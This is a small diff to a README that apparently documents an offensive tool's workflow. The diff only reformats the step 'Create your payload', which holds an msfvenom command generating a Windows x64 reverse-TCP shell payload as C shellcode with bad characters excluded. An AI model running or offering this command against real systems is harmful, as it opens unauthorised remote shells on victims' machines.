@@ -2,7 +2,9 @@
 
 ## 1. Create your payload
 
-ex with : ```msfvenom -p windows/x64/shell_reverse_tcp RHOST=192.168.245.132 LPORT=4444 -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f c > shellnew ```
+ex with : 
+
+```msfvenom -p windows/x64/shell_reverse_tcp RHOST=192.168.245.132 LPORT=4444 -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f c > shellnew ```
 
 ## 2. Convert your shellcode
 
